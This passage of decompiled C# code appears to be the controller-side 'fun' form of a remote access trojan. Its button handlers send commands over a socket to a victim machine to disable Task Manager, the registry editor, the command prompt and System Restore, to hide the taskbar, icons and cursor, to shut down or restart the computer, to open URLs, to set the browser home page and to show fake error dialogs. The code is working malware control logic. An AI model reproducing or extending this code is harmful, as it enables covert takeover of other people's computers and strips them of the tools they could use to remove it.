		private void Button12_Click(object sender, EventArgs e)
		{
			this.sk.Send("HideTaskBar");
		}

		// Token: 0x06000547 RID: 1351 RVA: 0x00003A45 File Offset: 0x00001C45
		private void Button11_Click(object sender, EventArgs e)
		{
			this.sk.Send("ShowTaskBar");
		}

		// Token: 0x06000548 RID: 1352 RVA: 0x00003A58 File Offset: 0x00001C58
		private void Button18_Click(object sender, EventArgs e)
		{
			this.sk.Send("DisableRestore");
		}

		// Token: 0x06000549 RID: 1353 RVA: 0x00003A6B File Offset: 0x00001C6B
		private void Button17_Click(object sender, EventArgs e)
		{
			this.sk.Send("EnableRestore");
		}

		// Token: 0x0600054A RID: 1354 RVA: 0x00003A7E File Offset: 0x00001C7E
		private void Button14_Click(object sender, EventArgs e)
		{
			this.sk.Send("DisableCMD");
		}

		// Token: 0x0600054B RID: 1355 RVA: 0x00003A91 File Offset: 0x00001C91
		private void Button13_Click(object sender, EventArgs e)
		{
			this.sk.Send("EnableCMD");
		}

		// Token: 0x0600054C RID: 1356 RVA: 0x00003AA4 File Offset: 0x00001CA4
		private void Button16_Click(object sender, EventArgs e)
		{
			this.sk.Send("DisableRegistry");
		}

		// Token: 0x0600054D RID: 1357 RVA: 0x00003AB7 File Offset: 0x00001CB7
		private void Button15_Click(object sender, EventArgs e)
		{
			this.sk.Send("EnableRegistry");
		}

		// Token: 0x0600054E RID: 1358 RVA: 0x00003ACA File Offset: 0x00001CCA
		private void Button10_Click(object sender, EventArgs e)
		{
			this.sk.Send("DisableTaskManager");
		}

		// Token: 0x0600054F RID: 1359 RVA: 0x00003ADD File Offset: 0x00001CDD
		private void Button9_Click(object sender, EventArgs e)
		{
			this.sk.Send("EnableTaskManager");
		}

		// Token: 0x06000550 RID: 1360 RVA: 0x00003AF0 File Offset: 0x00001CF0
		private void Button27_Click(object sender, EventArgs e)
		{
			this.sk.Send("IconsOFF");
		}

		// Token: 0x06000551 RID: 1361 RVA: 0x00003B03 File Offset: 0x00001D03
		private void Button26_Click(object sender, EventArgs e)
		{
			this.sk.Send("IconsON");
		}

		// Token: 0x06000552 RID: 1362 RVA: 0x00003B16 File Offset: 0x00001D16
		private void Button32_Click(object sender, EventArgs e)
		{
			this.sk.Send("ClockOFF");
		}

		// Token: 0x06000553 RID: 1363 RVA: 0x00003B29 File Offset: 0x00001D29
		private void Button33_Click(object sender, EventArgs e)
		{
			this.sk.Send("ClockON");
		}

		// Token: 0x06000554 RID: 1364 RVA: 0x00003B3C File Offset: 0x00001D3C
		private void Button28_Click(object sender, EventArgs e)
		{
			this.sk.Send("CursorHide");
		}

		// Token: 0x06000555 RID: 1365 RVA: 0x00003B4F File Offset: 0x00001D4F
		private void Button29_Click(object sender, EventArgs e)
		{
			this.sk.Send("CursorShow");
		}

		// Token: 0x06000556 RID: 1366 RVA: 0x00003B62 File Offset: 0x00001D62
		private void Button19_Click(object sender, EventArgs e)
		{
			this.sk.Send("shutdowncomputer");
		}

		// Token: 0x06000557 RID: 1367 RVA: 0x00003B75 File Offset: 0x00001D75
		private void Button20_Click(object sender, EventArgs e)
		{
			this.sk.Send("restartcomputer");
		}

		// Token: 0x06000558 RID: 1368 RVA: 0x00003B88 File Offset: 0x00001D88
		private void Button21_Click(object sender, EventArgs e)
		{
			this.sk.Send("logoff");
		}

		// Token: 0x06000559 RID: 1369 RVA: 0x00003B9B File Offset: 0x00001D9B
		private void Button22_Click(object sender, EventArgs e)
		{
			this.sk.Send("URL" + ima.Y + this.TextBox1.Text);
		}

		// Token: 0x0600055A RID: 1370 RVA: 0x00003BC3 File Offset: 0x00001DC3
		private void Button23_Click(object sender, EventArgs e)
		{
			this.sk.Send("IEhome" + ima.Y + this.TextBox2.Text);
		}

		// Token: 0x0600055B RID: 1371
		[DllImport("KERNEL32.DLL")]
		public static extern void Beep(int freq, int dur);

		// Token: 0x0600055C RID: 1372 RVA: 0x0002F530 File Offset: 0x0002D730
		private void Button52_Click(object sender, EventArgs e)
		{
			this.sk.Send("piano" + ima.Y + Conversions.ToString(361));
			if (this.Check_Sound.Checked)
			{
				FrmFun.Beep(361, 300);
			}
		}

		// Token: 0x0600055D RID: 1373 RVA: 0x0002F584 File Offset: 0x0002D784
		private void Button44_Click(object sender, EventArgs e)
		{
			this.sk.Send("piano" + ima.Y + Conversions.ToString(277));
			if (this.Check_Sound.Checked)
			{
				FrmFun.Beep(277, 300);
			}
		}

		// Token: 0x0600055E RID: 1374 RVA: 0x0002F5D8 File Offset: 0x0002D7D8
		private void Button51_Click(object sender, EventArgs e)
		{
			this.sk.Send("piano" + ima.Y + Conversions.ToString(393));
			if (this.Check_Sound.Checked)
			{
				FrmFun.Beep(393, 300);
			}
		}

		// Token: 0x0600055F RID: 1375 RVA: 0x0002F62C File Offset: 0x0002D82C
		private void Button50_Click(object sender, EventArgs e)
		{
			this.sk.Send("piano" + ima.Y + Conversions.ToString(429));
			if (this.Check_Sound.Checked)
			{
				FrmFun.Beep(429, 300);
			}
		}

		// Token: 0x06000560 RID: 1376 RVA: 0x0002F680 File Offset: 0x0002D880
		private void Button49_Click(object sender, EventArgs e)
		{
			this.sk.Send("piano" + ima.Y + Conversions.ToString(449));
			if (this.Check_Sound.Checked)
			{
				FrmFun.Beep(449, 300);
			}
		}

		// Token: 0x06000561 RID: 1377 RVA: 0x0002F6D4 File Offset: 0x0002D8D4
		private void Button42_Click(object sender, EventArgs e)
		{
			this.sk.Send("piano" + ima.Y + Conversions.ToString(369));
			if (this.Check_Sound.Checked)
			{
				FrmFun.Beep(369, 300);
			}
		}

		// Token: 0x06000562 RID: 1378 RVA: 0x0002F728 File Offset: 0x0002D928
		private void Button48_Click(object sender, EventArgs e)
		{
			this.sk.Send("piano" + ima.Y + Conversions.ToString(491));
			if (this.Check_Sound.Checked)
			{
				FrmFun.Beep(491, 300);
			}
		}

		// Token: 0x06000563 RID: 1379 RVA: 0x0002F77C File Offset: 0x0002D97C
		private void Button41_Click(object sender, EventArgs e)
		{
			this.sk.Send("piano" + ima.Y + Conversions.ToString(415));
			if (this.Check_Sound.Checked)
			{
				FrmFun.Beep(415, 300);
			}
		}

		// Token: 0x06000564 RID: 1380 RVA: 0x0002F7D0 File Offset: 0x0002D9D0
		private void Button47_Click(object sender, EventArgs e)
		{
			this.sk.Send("piano" + ima.Y + Conversions.ToString(540));
			if (this.Check_Sound.Checked)
			{
				FrmFun.Beep(540, 300);
			}
		}

		// Token: 0x06000565 RID: 1381 RVA: 0x0002F824 File Offset: 0x0002DA24
		private void Button40_Click(object sender, EventArgs e)
		{
			this.sk.Send("piano" + ima.Y + Conversions.ToString(466));
			if (this.Check_Sound.Checked)
			{
				FrmFun.Beep(466, 300);
			}
		}

		// Token: 0x06000566 RID: 1382 RVA: 0x0002F878 File Offset: 0x0002DA78
		private void Button46_Click(object sender, EventArgs e)
		{
			this.sk.Send("piano" + ima.Y + Conversions.ToString(593));
			if (this.Check_Sound.Checked)
			{
				FrmFun.Beep(593, 300);
			}
		}

		// Token: 0x06000567 RID: 1383 RVA: 0x0002F8CC File Offset: 0x0002DACC
		private void Button45_Click(object sender, EventArgs e)
		{
			this.sk.Send("piano" + ima.Y + Conversions.ToString(623));
			if (this.Check_Sound.Checked)
			{
				FrmFun.Beep(623, 300);
			}
		}

		// Token: 0x06000568 RID: 1384 RVA: 0x0002F920 File Offset: 0x0002DB20
		private void Button36_Click(object sender, EventArgs e)
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.Spvoice", ""));
			object arg_48_0 = objectValue;
			Type arg_48_1 = null;
			string arg_48_2 = "speak";
			object[] array = new object[1];
			object[] arg_32_0 = array;
			int arg_32_1 = 0;
			TextBox textBox = this.TextBox5;
			arg_32_0[arg_32_1] = textBox.Text;
			object[] array2 = array;
			object[] arg_48_3 = array2;
			string[] arg_48_4 = null;
			Type[] arg_48_5 = null;
			bool[] array3 = new bool[]
			{
				true
			};
			NewLateBinding.LateCall(arg_48_0, arg_48_1, arg_48_2, arg_48_3, arg_48_4, arg_48_5, array3, true);
			if (array3[0])
			{
				textBox.Text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
			}
		}

		// Token: 0x06000569 RID: 1385 RVA: 0x00003BEB File Offset: 0x00001DEB
		private void Button34_Click(object sender, EventArgs e)
		{
			this.sk.Send("TextToSpeech" + ima.Y + this.TextBox5.Text);
		}

		// Token: 0x0600056A RID: 1386 RVA: 0x0002F9A4 File Offset: 0x0002DBA4
		private void Button35_Click(object sender, EventArgs e)
		{
			this.sk.Send(string.Concat(new string[]
			{
				"BepX",
				ima.Y,
				this.TextBox4.Text,
				ima.Y,
				this.TextBox3.Text
			}));
		}

		// Token: 0x0600056B RID: 1387 RVA: 0x0002FA00 File Offset: 0x0002DC00
		private void Button37_Click(object sender, EventArgs e)
		{
			string text = "";
			string text2 = "";
			if (this.ComboBox1.SelectedIndex == 0)
			{
				text2 = "1";
			}
			else if (this.ComboBox1.SelectedIndex == 1)
			{
				text2 = "2";
			}
			else if (this.ComboBox1.SelectedIndex == 2)
			{
				text2 = "3";
			}
			else if (this.ComboBox1.SelectedIndex == 3)
			{
				text2 = "4";
			}
			if (this.ComboBox2.SelectedIndex == 0)
			{
				text = "1";
			}
			else if (this.ComboBox2.SelectedIndex == 1)
			{
				text = "2";
			}
			else if (this.ComboBox2.SelectedIndex == 2)
			{
				text = "3";
			}
			else if (this.ComboBox2.SelectedIndex == 3)
			{
				text = "4";
			}
			else if (this.ComboBox2.SelectedIndex == 4)
			{
				text = "5";
			}
			else if (this.ComboBox2.SelectedIndex == 5)
			{
				text = "6";
			}
			this.sk.Send(string.Concat(new string[]
			{
				"ErorrMsg",
				ima.Y,
				text2,
				ima.Y,
				text,
				ima.Y,
				this.TextBox6.Text,
				ima.Y,
				this.TextBox7.Text
			}));
		}

		// Token: 0x0600056C RID: 1388 RVA: 0x0002FB6C File Offset: 0x0002DD6C
		private void Button38_Click(object sender, EventArgs e)
		{
			MessageBoxIcon icon;
			if (this.ComboBox1.SelectedIndex == 0)
			{
				icon = MessageBoxIcon.Asterisk;
			}
			else if (this.ComboBox1.SelectedIndex == 1)
			{
				icon = MessageBoxIcon.Question;
			}
			else if (this.ComboBox1.SelectedIndex == 2)
			{
				icon = MessageBoxIcon.Exclamation;
			}
			else if (this.ComboBox1.SelectedIndex == 3)
			{
				icon = MessageBoxIcon.Hand;
			}
			else
			{
				icon = MessageBoxIcon.Asterisk;
			}
			MessageBoxButtons buttons;
			if (this.ComboBox2.SelectedIndex == 0)
			{
				buttons = MessageBoxButtons.YesNo;
			}
			else if (this.ComboBox2.SelectedIndex == 1)
			{
				buttons = MessageBoxButtons.YesNoCancel;
			}
			else if (this.ComboBox2.SelectedIndex == 2)
			{
				buttons = MessageBoxButtons.OK;
			}
			else if (this.ComboBox2.SelectedIndex == 3)
			{
				buttons = MessageBoxButtons.OKCancel;
			}
			else if (this.ComboBox2.SelectedIndex == 4)
			{
				buttons = MessageBoxButtons.RetryCancel;
			}
			else if (this.ComboBox2.SelectedIndex == 5)
			{
				buttons = MessageBoxButtons.AbortRetryIgnore;
			}
			else
			{
				buttons = MessageBoxButtons.OK;
			}
			MessageBox.Show(this.TextBox7.Text, this.TextBox6.Text, buttons, icon);
		}

		// Token: 0x0600056D RID: 1389 RVA: 0x0002FC68 File Offset: 0x0002DE68
		private void ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
		{
			if (this.ComboBox1.SelectedIndex == 0)
			{
				this.PictureBox1.Image = Resources._55;
			}
			else if (this.ComboBox1.SelectedIndex == 1)
			{
				this.PictureBox1.Image = Resources._52;
			}
			else if (this.ComboBox1.SelectedIndex == 2)
			{
				this.PictureBox1.Image = Resources._54;
			}
			else if (this.ComboBox1.SelectedIndex == 3)
			{
				this.PictureBox1.Image = Resources._53;
			}
		}

		// Token: 0x0600056E RID: 1390 RVA: 0x0002FCFC File Offset: 0x0002DEFC
		private void ComboBox3_SelectedIndexChanged(object sender, EventArgs e)
		{
			try
			{
				this.PictureBox2.Image = Image.FromFile(Conversions.ToString(Operators.ConcatenateObject(this.folder, this.ComboBox3.Text)));
			}
			catch (Exception expr_2E)
			{
				ProjectData.SetProjectError(expr_2E);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x0600056F RID: 1391 RVA: 0x0002FD58 File Offset: 0x0002DF58
		private void Button55_Click(object sender, EventArgs e)
		{
			bool flag = true;
			string text = Convert.ToBase64String(Fungsi.ZIP(File.ReadAllBytes(Conversions.ToString(Operators.ConcatenateObject(this.folder, this.ComboBox3.Text))), ref flag));
			byte[] array = Fungsi.SB(ref text);
			MemoryStream memoryStream = new MemoryStream();
			string text2 = "terror" + ima.Y + new FileInfo(Conversions.ToString(Operators.ConcatenateObject(this.folder, this.ComboBox3.Text))).Extension + ima.Y;
			memoryStream.Write(Fungsi.SB(ref text2), 0, text2.Length);
			memoryStream.Write(array, 0, array.Length);
			this.sk.Send(memoryStream.ToArray());
		}

		// Token: 0x06000570 RID: 1392 RVA: 0x0002FE10 File Offset: 0x0002E010
		private void Timer1_Tick(object sender, EventArgs e)
		{
			if (this.osk == null | this.sk == null)
			{
				this.Close();
			}
			if (!this.osk.CN | !this.sk.CN)
			{
				this.Close();
			}
		}

		// Token: 0x06000571 RID: 1393 RVA: 0x00003C13 File Offset: 0x00001E13
		private void Button30_Click(object sender, EventArgs e)
		{
			this.sk.Send("TaskbarHide");
		}

		// Token: 0x06000572 RID: 1394 RVA: 0x00003C26 File Offset: 0x00001E26
		private void Button31_Click(object sender, EventArgs e)
		{
			this.sk.Send("TaskbarShow");
		}

		// Token: 0x06000573 RID: 1395 RVA: 0x0002FE60 File Offset: 0x0002E060
		private void Button43_Click(object sender, EventArgs e)
		{
			this.sk.Send("piano" + ima.Y + Conversions.ToString(311));
			if (this.Check_Sound.Checked)
			{
				FrmFun.Beep(311, 300);
			}
		}

		// Token: 0x06000574 RID: 1396 RVA: 0x0002FEB4 File Offset: 0x0002E0B4
		private void Button54_Click(object sender, EventArgs e)
		{
			this.TabControl1.SelectedTab = this.TabPage1;
			this.Button54.BackColor = Color.FromArgb(40, 40, 40);
			this.Button53.BackColor = Color.FromArgb(10, 10, 10);
			this.Button39.BackColor = Color.FromArgb(10, 10, 10);
			this.Button27.BackColor = Color.FromArgb(10, 10, 10);
		}

		// Token: 0x06000575 RID: 1397 RVA: 0x0002FF2C File Offset: 0x0002E12C
		private void Button53_Click(object sender, EventArgs e)
		{
			this.TabControl1.SelectedTab = this.TabPage2;
			this.Button53.BackColor = Color.FromArgb(40, 40, 40);
			this.Button54.BackColor = Color.FromArgb(10, 10, 10);
			this.Button39.BackColor = Color.FromArgb(10, 10, 10);
			this.Button27.BackColor = Color.FromArgb(10, 10, 10);
		}

		// Token: 0x06000576 RID: 1398 RVA: 0x0002FFA4 File Offset: 0x0002E1A4
		private void Button39_Click(object sender, EventArgs e)
		{
			this.Button39.BackColor = Color.FromArgb(40, 40, 40);
			this.Button53.BackColor = Color.FromArgb(10, 10, 10);
			this.Button54.BackColor = Color.FromArgb(10, 10, 10);
			this.Button27.BackColor = Color.FromArgb(10, 10, 10);
			this.TabControl1.SelectedTab = this.TabPage3;
		}

		// Token: 0x06000577 RID: 1399 RVA: 0x0003001C File Offset: 0x0002E21C
		private void Button27_Click_1(object sender, EventArgs e)
		{
			this.Button27.BackColor = Color.FromArgb(40, 40, 40);
			this.Button53.BackColor = Color.FromArgb(10, 10, 10);
			this.Button39.BackColor = Color.FromArgb(10, 10, 10);
			this.Button54.BackColor = Color.FromArgb(10, 10, 10);
			this.TabControl1.SelectedTab = this.TabPage4;
		}

		// Token: 0x0400021B RID: 539
		private static List<WeakReference> __ENCList;

		// Token: 0x0400021D RID: 541
		[AccessedThroughProperty("Button2")]
		private Button _Button2;

		// Token: 0x0400021E RID: 542
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x0400021F RID: 543
		[AccessedThroughProperty("Button3")]
		private Button _Button3;

		// Token: 0x04000220 RID: 544
		[AccessedThroughProperty("Button4")]
		private Button _Button4;

		// Token: 0x04000221 RID: 545
		[AccessedThroughProperty("Button5")]
		private Button _Button5;

		// Token: 0x04000222 RID: 546
		[AccessedThroughProperty("Button6")]
		private Button _Button6;

		// Token: 0x04000223 RID: 547
		[AccessedThroughProperty("Button7")]
		private Button _Button7;

		// Token: 0x04000224 RID: 548
		[AccessedThroughProperty("Button8")]
		private Button _Button8;

		// Token: 0x04000225 RID: 549
		[AccessedThroughProperty("Button11")]
		private Button _Button11;

		// Token: 0x04000226 RID: 550
		[AccessedThroughProperty("Button12")]
		private Button _Button12;

		// Token: 0x04000227 RID: 551
		[AccessedThroughProperty("Button13")]
		private Button _Button13;

		// Token: 0x04000228 RID: 552
		[AccessedThroughProperty("Button14")]
		private Button _Button14;

		// Token: 0x04000229 RID: 553
		[AccessedThroughProperty("Button15")]
		private Button _Button15;

		// Token: 0x0400022A RID: 554
		[AccessedThroughProperty("Button16")]
		private Button _Button16;

		// Token: 0x0400022B RID: 555
		[AccessedThroughProperty("Button17")]
		private Button _Button17;

		// Token: 0x0400022C RID: 556
		[AccessedThroughProperty("Button18")]
		private Button _Button18;

		// Token: 0x0400022D RID: 557
		[AccessedThroughProperty("Button9")]
		private Button _Button9;

		// Token: 0x0400022E RID: 558
		[AccessedThroughProperty("Button10")]
		private Button _Button10;

		// Token: 0x0400022F RID: 559
		[AccessedThroughProperty("Button29")]
		private Button _Button29;

		// Token: 0x04000230 RID: 560
		[AccessedThroughProperty("Button28")]
		private Button _Button28;

		// Token: 0x04000231 RID: 561
		[AccessedThroughProperty("Button26")]
		private Button _Button26;

		// Token: 0x04000232 RID: 562
		[AccessedThroughProperty("Button33")]
		private Button _Button33;

		// Token: 0x04000233 RID: 563
		[AccessedThroughProperty("Button32")]
		private Button _Button32;

		// Token: 0x04000234 RID: 564
		[AccessedThroughProperty("Button30")]
		private Button _Button30;

		// Token: 0x04000235 RID: 565
		[AccessedThroughProperty("Button31")]
		private Button _Button31;

		// Token: 0x04000236 RID: 566
		[AccessedThroughProperty("Button24")]
		private Button _Button24;

		// Token: 0x04000237 RID: 567
		[AccessedThroughProperty("Button25")]
		private Button _Button25;

		// Token: 0x04000238 RID: 568
		[AccessedThroughProperty("Button19")]
		private Button _Button19;

		// Token: 0x04000239 RID: 569
		[AccessedThroughProperty("Button20")]
		private Button _Button20;

		// Token: 0x0400023A RID: 570
		[AccessedThroughProperty("Button21")]
		private Button _Button21;

		// Token: 0x0400023B RID: 571
		[AccessedThroughProperty("Button22")]
		private Button _Button22;

		// Token: 0x0400023C RID: 572
		[AccessedThroughProperty("Button23")]
		private Button _Button23;

		// Token: 0x0400023D RID: 573
		[AccessedThroughProperty("Label2")]
		private Label _Label2;

		// Token: 0x0400023E RID: 574
		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		// Token: 0x0400023F RID: 575
		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		// Token: 0x04000240 RID: 576
		[AccessedThroughProperty("TextBox2")]
		private TextBox _TextBox2;

		// Token: 0x04000241 RID: 577
		[AccessedThroughProperty("Button40")]
		private Button _Button40;

		// Token: 0x04000242 RID: 578
		[AccessedThroughProperty("Button41")]
		private Button _Button41;

		// Token: 0x04000243 RID: 579
		[AccessedThroughProperty("Button42")]
		private Button _Button42;

		// Token: 0x04000244 RID: 580
		[AccessedThroughProperty("Button44")]
		private Button _Button44;

		// Token: 0x04000245 RID: 581
		[AccessedThroughProperty("Button45")]
		private Button _Button45;

		// Token: 0x04000246 RID: 582
		[AccessedThroughProperty("Button46")]
		private Button _Button46;

		// Token: 0x04000247 RID: 583
		[AccessedThroughProperty("Button47")]
		private Button _Button47;

		// Token: 0x04000248 RID: 584
		[AccessedThroughProperty("Button48")]
		private Button _Button48;

		// Token: 0x04000249 RID: 585
		[AccessedThroughProperty("Button49")]
		private Button _Button49;

		// Token: 0x0400024A RID: 586
		[AccessedThroughProperty("Button50")]
		private Button _Button50;

		// Token: 0x0400024B RID: 587
		[AccessedThroughProperty("Button51")]
		private Button _Button51;

		// Token: 0x0400024C RID: 588
		[AccessedThroughProperty("Button52")]
		private Button _Button52;

		// Token: 0x0400024D RID: 589
		[AccessedThroughProperty("Check_Sound")]
		private CheckBox _Check_Sound;

		// Token: 0x0400024E RID: 590
		[AccessedThroughProperty("ComboBox2")]
		private ComboBox _ComboBox2;

		// Token: 0x0400024F RID: 591
		[AccessedThroughProperty("ComboBox1")]
		private ComboBox _ComboBox1;

		// Token: 0x04000250 RID: 592
		[AccessedThroughProperty("Button36")]
		private Button _Button36;

		// Token: 0x04000251 RID: 593
		[AccessedThroughProperty("Button34")]
		private Button _Button34;

		// Token: 0x04000252 RID: 594
		[AccessedThroughProperty("TextBox5")]
		private TextBox _TextBox5;

		// Token: 0x04000253 RID: 595
		[AccessedThroughProperty("Label3")]
		private Label _Label3;

		// Token: 0x04000254 RID: 596
		[AccessedThroughProperty("Label4")]
		private Label _Label4;

		// Token: 0x04000255 RID: 597
		[AccessedThroughProperty("TextBox3")]
		private TextBox _TextBox3;

		// Token: 0x04000256 RID: 598
		[AccessedThroughProperty("Button35")]
		private Button _Button35;

		// Token: 0x04000257 RID: 599
		[AccessedThroughProperty("TextBox4")]
		private TextBox _TextBox4;

		// Token: 0x04000258 RID: 600
		[AccessedThroughProperty("Button38")]
		private Button _Button38;

		// Token: 0x04000259 RID: 601
		[AccessedThroughProperty("Button37")]
		private Button _Button37;

		// Token: 0x0400025A RID: 602
		[AccessedThroughProperty("Label6")]
		private Label _Label6;

		// Token: 0x0400025B RID: 603
		[AccessedThroughProperty("PictureBox1")]
		private PictureBox _PictureBox1;

		// Token: 0x0400025C RID: 604
		[AccessedThroughProperty("Label5")]
		private Label _Label5;

		// Token: 0x0400025D RID: 605
		[AccessedThroughProperty("TextBox7")]
		private TextBox _TextBox7;

		// Token: 0x0400025E RID: 606
		[AccessedThroughProperty("TextBox6")]
		private TextBox _TextBox6;

		// Token: 0x0400025F RID: 607
		[AccessedThroughProperty("ComboBox3")]
		private ComboBox _ComboBox3;

		// Token: 0x04000260 RID: 608
		[AccessedThroughProperty("Button55")]
		private Button _Button55;

		// Token: 0x04000261 RID: 609
		[AccessedThroughProperty("PictureBox2")]
		private PictureBox _PictureBox2;

		// Token: 0x04000262 RID: 610
		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		// Token: 0x04000263 RID: 611
		[AccessedThroughProperty("NumericUpDown1")]
		private NumericUpDown _NumericUpDown1;

		// Token: 0x04000264 RID: 612
		[AccessedThroughProperty("Label7")]
		private Label _Label7;

		// Token: 0x04000265 RID: 613
		[AccessedThroughProperty("PN1")]
		private Panel _PN1;

		// Token: 0x04000266 RID: 614
		[AccessedThroughProperty("PN2")]
		private Panel _PN2;

		// Token: 0x04000267 RID: 615
		[AccessedThroughProperty("Pn3")]
		private Panel _Pn3;

		// Token: 0x04000268 RID: 616
		[AccessedThroughProperty("PN4")]
		private Panel _PN4;

		// Token: 0x04000269 RID: 617
		[AccessedThroughProperty("GroupPanelBox2")]
		private GroupPanelBox _GroupPanelBox2;

		// Token: 0x0400026A RID: 618
		[AccessedThroughProperty("GroupPanelBox1")]
		private GroupPanelBox _GroupPanelBox1;

		// Token: 0x0400026B RID: 619
		[AccessedThroughProperty("GroupDropBox6")]
		private GroupDropBox _GroupDropBox6;

		// Token: 0x0400026C RID: 620
		[AccessedThroughProperty("GroupDropBox5")]
		private GroupDropBox _GroupDropBox5;

		// Token: 0x0400026D RID: 621
		[AccessedThroughProperty("GroupDropBox4")]
		private GroupDropBox _GroupDropBox4;

		// Token: 0x0400026E RID: 622
		[AccessedThroughProperty("GroupDropBox3")]
		private GroupDropBox _GroupDropBox3;

		// Token: 0x0400026F RID: 623
		[AccessedThroughProperty("GroupDropBox2")]
		private GroupDropBox _GroupDropBox2;

		// Token: 0x04000270 RID: 624
		[AccessedThroughProperty("GroupDropBox1")]
		private GroupDropBox _GroupDropBox1;

		// Token: 0x04000271 RID: 625
		[AccessedThroughProperty("TabControl1")]
		private TabControl _TabControl1;

		// Token: 0x04000272 RID: 626
		[AccessedThroughProperty("TabPage1")]
		private TabPage _TabPage1;

		// Token: 0x04000273 RID: 627
		[AccessedThroughProperty("TabPage2")]
		private TabPage _TabPage2;

		// Token: 0x04000274 RID: 628
		[AccessedThroughProperty("TabPage3")]
		private TabPage _TabPage3;

		// Token: 0x04000275 RID: 629
		[AccessedThroughProperty("TabPage4")]
		private TabPage _TabPage4;

		// Token: 0x04000276 RID: 630
		[AccessedThroughProperty("Button43")]
		private Button _Button43;

		// Token: 0x04000277 RID: 631
		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

		// Token: 0x04000278 RID: 632
		[AccessedThroughProperty("Button27")]
		private Button _Button27;

		// Token: 0x04000279 RID: 633
		[AccessedThroughProperty("Button39")]
		private Button _Button39;

		// Token: 0x0400027A RID: 634
		[AccessedThroughProperty("Button53")]
		private Button _Button53;

		// Token: 0x0400027B RID: 635
		[AccessedThroughProperty("Button54")]
		private Button _Button54;

		// Token: 0x0400027C RID: 636
		public Client osk;

		// Token: 0x0400027D RID: 637
		public Client sk;

		// Token: 0x0400027E RID: 638
		public string folder;
	}
}
